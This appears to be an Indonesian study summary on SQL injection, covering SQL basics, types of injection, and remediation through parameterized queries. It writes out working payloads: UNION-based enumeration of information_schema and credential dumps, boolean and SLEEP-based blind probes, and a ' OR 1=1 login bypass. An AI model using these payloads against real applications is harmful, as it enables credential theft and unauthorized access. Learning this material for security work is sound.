```
=== SQL Injection - Resume Materi ===
[17 Mar 2026]

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 APA ITU SQL & DATABASE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SQL      : Structured Query Language → bahasa untuk query database
Database : Penyimpanan data elektronik yang terorganisir
DBMS     : Database Management System → software pengatur database
           Contoh : MySQL, PostgreSQL, SQLite, Microsoft SQL Server
Tipe DB  : Relational   → pakai tabel, kolom, baris, ada primary key
           Non-Relational → NoSQL, tidak pakai tabel
           Contoh NoSQL : MongoDB, Cassandra, ElasticSearch

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 STRUKTUR DATABASE
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Kolom    : Header berjejer KIRI → KANAN (field/kategori data)
           Tipe data : integer, string, date, geospatial
           Auto-increment → buat key field yang unik tiap baris
Baris    : Data berjejer ATAS → BAWAH (satu record/entri)
Key Field: ID unik tiap baris → dipakai untuk relasi antar tabel

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 PERINTAH SQL WAJIB HAPAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SELECT   : Ambil data dari tabel
  select * from users;
  → * = semua kolom, from users = dari tabel users

  select username,password from users;
  → ambil kolom tertentu saja

  select * from users LIMIT 1;
  → ambil 1 baris pertama

  select * from users LIMIT 1,1;
  → skip 1 baris pertama, ambil 1 baris berikutnya
  → angka pertama = skip, angka kedua = ambil berapa

WHERE    : Filter data
  where username='admin'         → sama dengan
  where username != 'admin'      → tidak sama dengan
  where username='a' or username='b' → salah satu
  where username='a' and password='b' → keduanya harus cocok

LIKE     : Filter dengan wildcard %
  like 'a%'   → diawali huruf a
  like '%n'   → diakhiri huruf n
  like '%mi%' → mengandung "mi" dimanapun

UNION    : Gabung hasil 2+ SELECT
  Syarat : jumlah kolom HARUS sama
           tipe data kolom harus serupa
           urutan kolom harus sama

INSERT   : Tambah baris baru
  insert into users (username,password) values ('bob','pass123');

UPDATE   : Ubah data yang ada
  update users SET username='root' where username='admin';
  → SELALU pakai WHERE, kalau tidak semua baris ikut berubah!

DELETE   : Hapus data
  delete from users where username='martin';
  → SELALU pakai WHERE, kalau tidak semua data terhapus!

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 APA ITU SQL INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Definisi : Serangan saat input pengguna masuk langsung ke SQL query
           tanpa validasi → penyerang bisa manipulasi query database
Dampak   : Curi data, hapus data, ubah data, bypass login
Contoh   : URL ?id=1 → diubah jadi ?id=2;--
           → ; = akhir statement
           → -- = comment out sisa query asli

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 TIGA TIPE SQL INJECTION
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. IN-BAND SQLi        ← PALING MUDAH DIDETEKSI & DIEKSPLOITASI
   Definisi : Serangan & hasil di saluran yang SAMA
   Hasil    : Langsung tampil di halaman yang sama

   Error-Based  → Error DB tampil di browser
                  Pakai untuk : petakan struktur database
   Union-Based  → Pakai UNION untuk tarik data tambahan
                  Paling umum untuk ekstrak data banyak

2. BLIND SQLi          ← TIDAK ADA TAMPILAN LANGSUNG
   Boolean-Based → Indikator : perubahan tampilan halaman
                   true/false, taken/available, ada/tidak ada
   Time-Based    → Indikator : jeda waktu response (SLEEP)
                   Pakai SLEEP(x) → kalau ada delay = berhasil

3. OUT-OF-BAND SQLi    ← PALING JARANG
   Definisi : Dua saluran berbeda (serang ≠ terima hasil)
   Saluran 1 : web request untuk menyerang
   Saluran 2 : HTTP/DNS request untuk terima hasil
   Syarat    : fitur spesifik harus aktif di DB server

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR EKSPLOITASI UNION-BASED (IN-BAND)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Cari kerentanan  → coba karakter ' atau "
                      kalau error = vulnerable!
2. Cari jml kolom   → 0 UNION SELECT 1
                       0 UNION SELECT 1,2
                       0 UNION SELECT 1,2,3  ← sampai tidak error
3. Set ID = 0       → supaya query asli tidak return hasil
                      biar data kita yang tampil
4. Dapat nama DB    → 0 UNION SELECT 1,2,database()
5. Dapat tabel      → 0 UNION SELECT 1,2,group_concat(table_name)
                       FROM information_schema.tables
                       WHERE table_schema = 'nama_db'
6. Dapat kolom      → 0 UNION SELECT 1,2,group_concat(column_name)
                       FROM information_schema.columns
                       WHERE table_name = 'nama_tabel'
7. Ambil data       → 0 UNION SELECT 1,2,group_concat(username,':',
                       password SEPARATOR '<br>') FROM nama_tabel

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR EKSPLOITASI BOOLEAN-BASED (BLIND)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Prinsip  : Tebak satu karakter demi satu karakter
           Pakai LIKE + % sebagai wildcard
           true = cocok, false = tidak cocok

1. Cari jml kolom   → admin123' UNION SELECT 1;--  (false)
                       admin123' UNION SELECT 1,2,3;-- (true!)
2. Nama DB          → admin123' UNION SELECT 1,2,3
                       where database() like '%';--
                       Ganti % dengan a%, b%, s%... sampai true
3. Nama tabel       → ... FROM information_schema.tables
                       WHERE table_schema='nama_db'
                       and table_name like 'a%';--
4. Nama kolom       → ... FROM information_schema.COLUMNS
                       WHERE TABLE_SCHEMA='nama_db'
                       and TABLE_NAME='nama_tabel'
                       and COLUMN_NAME like 'a%'
                       and COLUMN_NAME !='id'; ← exclude yg sudah ketemu
5. Ambil data       → ... from users where username like 'a%
                       ... from users where username='admin'
                       and password like 'a%

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ALUR EKSPLOITASI TIME-BASED (BLIND)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Prinsip  : Sama seperti Boolean tapi indikatornya WAKTU
           Ada delay = true, Tidak ada delay = false
           Pakai SLEEP(x) → x = detik delay

Cari jml kolom → admin123' UNION SELECT SLEEP(5);--  (tidak ada delay)
                  admin123' UNION SELECT SLEEP(5),2;-- (delay 5 detik = true!)
Enumerasi      → Sama seperti Boolean, tambahkan SLEEP() di UNION SELECT
                  referrer=admin123' UNION SELECT SLEEP(5),2
                  where database() like 'u%';--

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 AUTHENTICATION BYPASS (BLIND SQLi)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Tujuan   : Bukan ambil data, tapi BYPASS login
Prinsip  : Buat query selalu return TRUE
Payload  : masukkan ke field password → ' OR 1=1;--
Query jadi : select * from users where username=''
             and password='' OR 1=1;
Kenapa berhasil : 1=1 selalu TRUE + operator OR
                  = query selalu return true = login berhasil

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 BUILT-IN YANG WAJIB HAPAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
information_schema  : Database bawaan MySQL, berisi metadata
                      semua user bisa akses ini secara default!
  .tables           : Berisi daftar semua tabel
  .columns          : Berisi daftar semua kolom
  table_schema      : Nama database pemilik tabel (kolom built-in)
  table_name        : Nama tabel (kolom built-in)
  column_name       : Nama kolom (kolom built-in)

database()          : Fungsi → return nama database aktif
group_concat()      : Gabungkan banyak baris jadi satu string
                      dipisah koma secara default
SLEEP(x)            : Buat query delay x detik
SEPARATOR '<br>'    : Pisahkan hasil dengan baris baru (HTML)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 KARAKTER PENTING DI SQLi
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
'        : Apostrophe → test kerentanan, tutup string
"        : Quotation mark → alternatif test kerentanan
;        : Akhiri SQL statement
--       : Comment out sisa query asli
%        : Wildcard untuk LIKE (cocok dengan apapun)
!=       : Tidak sama dengan
*        : Semua kolom (di SELECT)

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 REMEDIATION (CARA MENCEGAH SQLi)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. Prepared Statements (Parameterized Queries)
   → Tulis SQL query dulu, input user ditambah sebagai parameter
   → Struktur SQL tidak bisa berubah oleh input user
   → PALING EFEKTIF, kode juga lebih bersih & mudah dibaca

2. Input Validation
   → Allow list : batasi input hanya string/karakter tertentu
   → String replacement : filter karakter yang tidak diizinkan
   → Cegah input berbahaya masuk ke query

3. Escaping User Input
   → Tambahkan backslash (\) sebelum karakter berbahaya
   → Karakter seperti ' " $ \ jadi diperlakukan sebagai
     teks biasa, bukan karakter spesial SQL

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 ISTILAH PENTING YANG WAJIB HAPAL
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SQLi           : SQL Injection → serangan injeksi ke SQL query
In-Band        : Serangan & hasil di saluran yang sama
Blind SQLi     : Tidak ada output langsung di layar
Boolean-Based  : Indikator true/false dari tampilan halaman
Time-Based     : Indikator dari jeda waktu response (SLEEP)
Out-of-Band    : Dua saluran berbeda untuk serang & terima hasil
Auth Bypass    : Lewati login tanpa kredensial valid
Enumeration    : Proses pemetaan struktur database selangkah demi selangkah
Payload        : Kode/string inject yang dikirim ke sistem target
Wildcard       : Karakter % yang cocok dengan string apapun
Primary Key    : ID unik tiap baris untuk relasi antar tabel
Metadata       : Data tentang data (disimpan di information_schema)
Parameterized  : Query dengan parameter terpisah dari struktur SQL
Escaping       : Netralisir karakter berbahaya dengan backslash
DNS Exfil      : Eksfiltrasi data lewat DNS request (Out-of-Band)
SQLMap         : Tool otomatis untuk eksploitasi SQLi (advanced)
```